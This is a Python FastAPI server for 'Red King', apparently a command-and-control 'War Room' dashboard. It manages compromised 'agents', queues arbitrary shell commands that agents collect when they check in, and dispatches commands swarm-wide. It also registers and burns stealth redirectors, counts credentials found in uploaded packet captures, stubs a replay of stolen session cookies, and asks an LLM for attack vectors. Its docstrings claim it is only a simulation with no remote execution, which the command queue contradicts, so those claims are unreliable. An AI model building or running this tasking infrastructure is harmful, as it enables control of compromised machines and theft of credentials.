"""
Red King – War Room Backend
Simulation dashboard API. No offensive execution capabilities.
"""

# ── Load .env BEFORE any local module that reads os.getenv() ────────────────
import os
from pathlib import Path
from dotenv import load_dotenv

_ENV_PATH = Path(__file__).resolve().parent.parent / ".env"
load_dotenv(dotenv_path=_ENV_PATH, override=False)

# ── Standard library ─────────────────────────────────────────────────────────
import asyncio
import json
import logging
import shutil
import sys
import tempfile
import uuid
from collections import deque
from datetime import datetime
from typing import Any, Dict, List, Optional

# ── Third-party ───────────────────────────────────────────────────────────────
import uvicorn
from fastapi import (
    Depends, FastAPI, File, HTTPException, Request,
    UploadFile, WebSocket, WebSocketDisconnect,
)
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel

# ── Core modules (simulation-safe) ───────────────────────────────────────────
from app.core.database import sovereign_db
from app.core.logger import logger
from app.core.schemas import CommandRequest, ConsultationRequest, StrictAgentCheckIn
from app.core.security import check_rate_limit, check_strict_limit
from app.core.achievements import AchievementEngine
from app.core.redirector import RedirectorManager
from app.core.swarm_manager import SwarmManager
from app.core.advisor import StrategicAdvisor
from app.core.llm_commander import hive_mind
from app.core.pcap_forensics import PcapWarlord

# ── Path constants ────────────────────────────────────────────────────────────
BASE_DIR      = Path(__file__).resolve().parent
PROJECT_ROOT  = BASE_DIR.parent
FRONTEND_DIST = (PROJECT_ROOT / "war_room" / "dist").resolve()
FRONTEND_IDX  = FRONTEND_DIST / "index.html"
DNA_MAP_FILE  = PROJECT_ROOT / "master_dna_map.json"

# ── Shared in-memory state ────────────────────────────────────────────────────
pending_commands: Dict[str, List[Any]] = {}
intel_feed: deque = deque(maxlen=120)
autonomy_enabled: bool = False
_ws_pool: Dict[str, List[WebSocket]] = {}

def _emit(msg: str, kind: str = "INFO") -> None:
    """Append an event to the rolling intel feed."""
    intel_feed.appendleft({
        "id":   str(uuid.uuid4())[:8],
        "msg":  msg,
        "type": kind,
        "ts":   datetime.now().strftime("%H:%M:%S"),
    })

_emit("Red King backend online. War Room active.", "INFO")

# ── Core module instances ─────────────────────────────────────────────────────
achievement_engine = AchievementEngine(sovereign_db)
redirector_mgr     = RedirectorManager(sovereign_db)
swarm_mgr          = SwarmManager(sovereign_db, pending_commands)
strategic_advisor  = StrategicAdvisor(sovereign_db)

# ── FastAPI application ───────────────────────────────────────────────────────
app = FastAPI(
    title="Red King – War Room API",
    version="2.1.0",
    docs_url="/api/docs",
    redoc_url="/api/redoc",
)

# ── CORS ──────────────────────────────────────────────────────────────────────
# Configurable via ALLOWED_ORIGINS env var (comma-separated).
# Defaults cover local Vite dev server + Docker-mapped port.
_raw_origins = os.getenv(
    "ALLOWED_ORIGINS",
    "http://localhost:5173,http://localhost:5555,http://127.0.0.1:5173",
)
_allowed_origins: List[str] = [o.strip() for o in _raw_origins.split(",") if o.strip()]

if os.getenv("ALLOW_ALL_ORIGINS", "false").lower() in ("1", "true", "yes"):
    _allowed_origins = ["*"]

app.add_middleware(
    CORSMiddleware,
    allow_origins=_allowed_origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

logger.info(f"[+] CORS allow_origins: {_allowed_origins}")


# ═══════════════════════════════════════════════════════════════════════════════
# HEALTH / SYSTEM
# ═══════════════════════════════════════════════════════════════════════════════

@app.get("/api/health")
async def health():
    return {"status": "OPERATIONAL", "module": "WAR_ROOM_DASHBOARD"}


@app.get("/api/status")
async def status():
    agents = sovereign_db.get_agents()
    now = datetime.now()
    active = sum(
        1 for a in agents.values()
        if (now - datetime.fromisoformat(a["last_seen"])).total_seconds() < 120
    )
    return {
        "system":       "OPERATIONAL",
        "hive_mind":    "ONLINE" if hive_mind.model else "OFFLINE",
        "active_nodes": active,
        "total_nodes":  len(agents),
        "uptime":       "STABLE",
    }


# ═══════════════════════════════════════════════════════════════════════════════
# INTEL FEED
# ═══════════════════════════════════════════════════════════════════════════════

@app.get("/api/intel")
async def get_intel():
    return list(intel_feed)[:30]


# ═══════════════════════════════════════════════════════════════════════════════
# AGENT MANAGEMENT  (local state – no remote execution)
# ═══════════════════════════════════════════════════════════════════════════════

@app.get("/api/agents")
async def list_agents():
    agents = sovereign_db.get_agents()
    now = datetime.now()
    result = []
    for aid, data in agents.items():
        try:
            active = (now - datetime.fromisoformat(data["last_seen"])).total_seconds() < 120
        except Exception:
            active = False
        result.append({
            "id":        aid,
            "ip":        data.get("ip", "0.0.0.0"),
            "os":        data.get("os", "Unknown"),
            "user":      data.get("user", "N/A"),
            "status":    "active" if active else "zombie",
            "last_seen": data.get("last_seen"),
        })
    return result


@app.post("/api/hive/checkin")
async def agent_checkin(payload: StrictAgentCheckIn):
    """Agent heartbeat – stores state locally and returns pending commands."""
    agent_id = payload.agent_id
    agent_data: dict = {}

    # Accept plain JSON or base64-encoded JSON (simulation agents send plain JSON)
    try:
        agent_data = json.loads(payload.data)
    except json.JSONDecodeError:
        import base64
        try:
            agent_data = json.loads(base64.b64decode(payload.data).decode())
        except Exception:
            agent_data = {"raw": payload.data}

    agent_data.setdefault("ip", "127.0.0.1")
    agent_data.setdefault("os", "Unknown")

    sovereign_db.upsert_agent(agent_id, agent_data)
    achievement_engine.evaluate()

    commands = pending_commands.pop(agent_id, [])
    _emit(f"Agent {agent_id[:8]} checked in from {agent_data.get('ip')}", "INFO")
    logger.info(f"[*] Heartbeat: {agent_id}")

    return {
        "status":      "ACKNOWLEDGED",
        "commands":    commands,
        "server_time": datetime.now().isoformat(),
    }


@app.post("/api/hive/queue")
async def queue_command(req: CommandRequest, _: bool = Depends(check_rate_limit)):
    """Queue a command token for an agent. State is local; no remote execution."""
    pending_commands.setdefault(req.agent_id, [])
    job_id = f"JOB_{str(uuid.uuid4())[:6].upper()}"
    pending_commands[req.agent_id].append({
        "type":   "shell",
        "cmd":    req.command,
        "job_id": job_id,
    })
    _emit(f"Command queued for {req.agent_id[:8]}: {req.command[:30]}", "STRATEGY")
    return {"status": "QUEUED", "job_id": job_id, "agent_id": req.agent_id}


# ═══════════════════════════════════════════════════════════════════════════════
# DNA MAP / INTEL FEED DATA
# ═══════════════════════════════════════════════════════════════════════════════

@app.get("/api/dna_map")
async def get_dna_map():
    """Return [{file, ip, dna}] from master_dna_map.json if present."""
    if not DNA_MAP_FILE.exists():
        return []
    try:
        with DNA_MAP_FILE.open() as f:
            data = json.load(f)
        if isinstance(data, list):
            return data
        if isinstance(data, dict):
            # Dict keyed by filename → normalise to list
            return [
                {
                    "file": key,
                    "ip":   val.get("ip", val.get("target", key)),
                    "dna":  val.get("dna", val.get("banner", str(val)[:120])),
                }
                for key, val in data.items()
                if isinstance(val, dict)
            ]
    except Exception as exc:
        logger.warning(f"[!] DNA map parse error: {exc}")
    return []


# ═══════════════════════════════════════════════════════════════════════════════
# SIMULATION RECON & AI ASSESSMENT
# ═══════════════════════════════════════════════════════════════════════════════

class GhostReconRequest(BaseModel):
    ip: str


@app.post("/api/ghost_recon")
async def ghost_recon(req: GhostReconRequest, _: bool = Depends(check_rate_limit)):
    """Simulation stub – no live network calls are made."""
    _emit(f"Ghost recon simulated on {req.ip}", "ALERT")
    return {
        "status": "SUCCESS",
        "ip":     req.ip,
        "title":  f"Simulation Target [{req.ip}]",
        "mode":   "SIMULATION",
    }


class AIAssessmentRequest(BaseModel):
    dna:   str
    title: str


@app.post("/api/ai_assessment")
async def ai_assessment(
    req: AIAssessmentRequest,
    _: bool = Depends(check_strict_limit),
):
    result = await hive_mind.analyze_target(dna=req.dna, title=req.title)
    # Guard: analyze_target may return a list when AI is offline
    if not isinstance(result, dict):
        return {
            "device_type":    "Unknown (AI Offline)",
            "threat_level":   "UNKNOWN",
            "attack_vector":  str(result),
        }
    return result


# ═══════════════════════════════════════════════════════════════════════════════
# SWARM MANAGEMENT
# ═══════════════════════════════════════════════════════════════════════════════

@app.get("/api/swarm/stats")
async def swarm_stats():
    return swarm_mgr.get_swarm_stats()


class SwarmExecuteRequest(BaseModel):
    command: Dict[str, Any]
    filters: Optional[Dict[str, Any]] = None


@app.post("/api/swarm/execute")
async def swarm_execute(req: SwarmExecuteRequest, _: bool = Depends(check_rate_limit)):
    targeted = swarm_mgr.dispatch_command(req.command, req.filters or {})
    _emit(f"Swarm command dispatched to {targeted} agents", "WARFARE")
    return {"status": "DISPATCHED", "targeted_agents": targeted}


@app.get("/api/swarm/jobs")
async def swarm_jobs():
    return swarm_mgr.get_jobs()


# ═══════════════════════════════════════════════════════════════════════════════
# ACHIEVEMENTS
# ═══════════════════════════════════════════════════════════════════════════════

@app.get("/api/achievements")
async def get_achievements():
    achievement_engine.evaluate()
    return achievement_engine.get_all_status()


# ═══════════════════════════════════════════════════════════════════════════════
# NEURAL MESH GRAPH
# ═══════════════════════════════════════════════════════════════════════════════

@app.get("/api/graph")
async def get_graph():
    return sovereign_db.get_graph()


# ═══════════════════════════════════════════════════════════════════════════════
# STEALTH REDIRECTORS  (local simulation registry)
# ═══════════════════════════════════════════════════════════════════════════════

@app.get("/api/stealth/redirectors")
async def list_redirectors():
    return redirector_mgr.get_all_redirectors()


class RegisterRedirectorRequest(BaseModel):
    ip:       str
    hostname: str
    type:     Optional[str] = "HTTP"


@app.post("/api/stealth/redirectors/register")
async def register_redirector(req: RegisterRedirectorRequest):
    rid = redirector_mgr.register_redirector(req.ip, req.hostname, req.type)
    _emit(f"Redirector {req.hostname} registered", "INFO")
    return {"status": "REGISTERED", "id": rid}


class BurnRedirectorRequest(BaseModel):
    id: str


@app.post("/api/stealth/redirectors/burn")
async def burn_redirector(req: BurnRedirectorRequest):
    redirector_mgr.burn_redirector(req.id)
    _emit(f"Redirector {req.id} burned", "ALERT")
    return {"status": "BURNED", "id": req.id}


# ═══════════════════════════════════════════════════════════════════════════════
# STRATEGIC ADVISOR
# ═══════════════════════════════════════════════════════════════════════════════

@app.get("/api/strategy/analyze")
async def strategy_analyze():
    return await strategic_advisor.analyze_battlefield()


# ═══════════════════════════════════════════════════════════════════════════════
# AI CONSULTATION
# ═══════════════════════════════════════════════════════════════════════════════

@app.post("/api/consult")
async def consult(req: ConsultationRequest, _: bool = Depends(check_strict_limit)):
    response = await hive_mind.get_strategic_advice(req.query)
    return {"response": response}


# ═══════════════════════════════════════════════════════════════════════════════
# NETWORK SCAN  (simulation stub)
# ═══════════════════════════════════════════════════════════════════════════════

@app.post("/api/scan")
async def network_scan(_: bool = Depends(check_rate_limit)):
    _emit("Network scan initiated (simulation)", "STRATEGY")
    return {
        "targets_found": 0,
        "details":       ["Simulation mode: deploy agents for live topology data."],
        "mode":          "SIMULATION",
    }


# ═══════════════════════════════════════════════════════════════════════════════
# SETTINGS
# ═══════════════════════════════════════════════════════════════════════════════

class AutonomyRequest(BaseModel):
    enabled: bool


@app.post("/api/settings/autonomy")
async def set_autonomy(req: AutonomyRequest):
    global autonomy_enabled
    autonomy_enabled = req.enabled
    _emit(f"Autonomy {'ENABLED' if req.enabled else 'DISABLED'}", "STRATEGY")
    return {"status": "OK", "autonomy": req.enabled}


# ═══════════════════════════════════════════════════════════════════════════════
# FORENSICS  (local PCAP analysis – no external connections)
# ═══════════════════════════════════════════════════════════════════════════════

@app.post("/api/forensics/upload")
async def forensics_upload(file: UploadFile = File(...)):
    suffix = Path(file.filename or "upload.pcap").suffix or ".pcap"
    with tempfile.NamedTemporaryFile(delete=False, suffix=suffix) as tmp:
        temp_path = Path(tmp.name)
    try:
        with temp_path.open("wb") as buf:
            shutil.copyfileobj(file.file, buf)

        warlord = PcapWarlord()
        report  = warlord.analyze_pcap(str(temp_path))

        # Convert sets to lists so the report is JSON-serialisable
        if isinstance(report.get("details", {}).get("devices"), dict):
            for dev in report["details"]["devices"].values():
                if isinstance(dev.get("ja3_signatures"), set):
                    dev["ja3_signatures"] = list(dev["ja3_signatures"])

        _emit(
            f"PCAP analysed: {report['device_count']} devices, "
            f"{report['credentials_found']} credentials",
            "ALERT" if report["credentials_found"] > 0 else "INFO",
        )
        return {"status": "ANALYSIS_COMPLETE", "report": report}

    except Exception as exc:
        logger.exception("PCAP analysis failed")
        return JSONResponse(status_code=500, content={"error": str(exc)})
    finally:
        temp_path.unlink(missing_ok=True)


# Legacy alias
@app.post("/api/analyze-pcap")
async def analyze_pcap_legacy(file: UploadFile = File(...)):
    return await forensics_upload(file)


# ═══════════════════════════════════════════════════════════════════════════════
# SESSION RESURRECTION  – simulation stub only
# ═══════════════════════════════════════════════════════════════════════════════

class ResurrectRequest(BaseModel):
    target_url: str
    cookies:    Optional[List[Any]] = None


@app.post("/api/war/resurrect")
async def resurrect_stub(req: ResurrectRequest):
    """
    Stub – actual browser-based replay runs in an isolated dedicated environment,
    not through the dashboard API.
    """
    return {
        "status":        "SIMULATION_MODE",
        "message":       "Session logged. Replay requires isolated execution environment.",
        "target_url":    req.target_url,
        "session_count": len(req.cookies or []),
    }


# ═══════════════════════════════════════════════════════════════════════════════
# MISSION REPORT  (download link in StrategicOverlay)
# ═══════════════════════════════════════════════════════════════════════════════

@app.get("/api/mission/report")
async def mission_report():
    graph  = sovereign_db.get_graph()
    agents = sovereign_db.get_agents()
    payload = {
        "generated_at":  datetime.now().isoformat(),
        "agent_count":   len(agents),
        "node_count":    len(graph["nodes"]),
        "link_count":    len(graph["links"]),
        "intel_events":  list(intel_feed)[:20],
    }
    return JSONResponse(
        content=payload,
        headers={"Content-Disposition": 'attachment; filename="mission_report.json"'},
    )


# ═══════════════════════════════════════════════════════════════════════════════
# WEBSOCKET  – agent / global stream
# ═══════════════════════════════════════════════════════════════════════════════

@app.websocket("/api/hive/stream/{agent_id}")
async def agent_stream(websocket: WebSocket, agent_id: str):
    await websocket.accept()
    _ws_pool.setdefault(agent_id, []).append(websocket)
    logger.info(f"[WS] Connected: {agent_id}")
    try:
        while True:
            await websocket.send_json({
                "type":     "HEARTBEAT",
                "agent_id": agent_id,
                "ts":       datetime.now().isoformat(),
                "intel":    list(intel_feed)[:5],
            })
            await asyncio.sleep(3)
    except WebSocketDisconnect:
        logger.info(f"[WS] Disconnected: {agent_id}")
    except Exception as exc:
        logger.warning(f"[WS] Error ({agent_id}): {exc}")
    finally:
        try:
            _ws_pool[agent_id].remove(websocket)
        except (ValueError, KeyError):
            pass


# ═══════════════════════════════════════════════════════════════════════════════
# STATIC FILE SERVING  (must be registered AFTER all API routes)
# ═══════════════════════════════════════════════════════════════════════════════

_assets = FRONTEND_DIST / "assets"
if _assets.exists():
    app.mount("/assets", StaticFiles(directory=str(_assets)), name="assets")

if FRONTEND_DIST.exists():
    # html=True makes Starlette serve index.html for any path without a matching file,
    # enabling client-side SPA routing.
    app.mount("/", StaticFiles(directory=str(FRONTEND_DIST), html=True), name="spa")
    logger.info(f"[+] Serving frontend from: {FRONTEND_DIST}")
else:
    logger.warning(
        f"[!] Frontend dist not found at {FRONTEND_DIST}. "
        "Run: cd Red_King_C2/war_room && npm run build"
    )

    @app.get("/{catchall:path}", include_in_schema=False)
    async def no_frontend(_: str):
        return JSONResponse(
            status_code=503,
            content={
                "error": "Frontend not built",
                "hint":  "cd Red_King_C2/war_room && npm run build",
            },
        )


# ═══════════════════════════════════════════════════════════════════════════════
# ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    _port   = int(os.getenv("PORT", 9001))
    _host   = os.getenv("HOST", "0.0.0.0")
    _reload = os.getenv("DEV_RELOAD", "false").lower() in ("1", "true")

    uvicorn.run(
        "app.main:app",
        host=_host,
        port=_port,
        reload=_reload,
        log_level="info",
    )
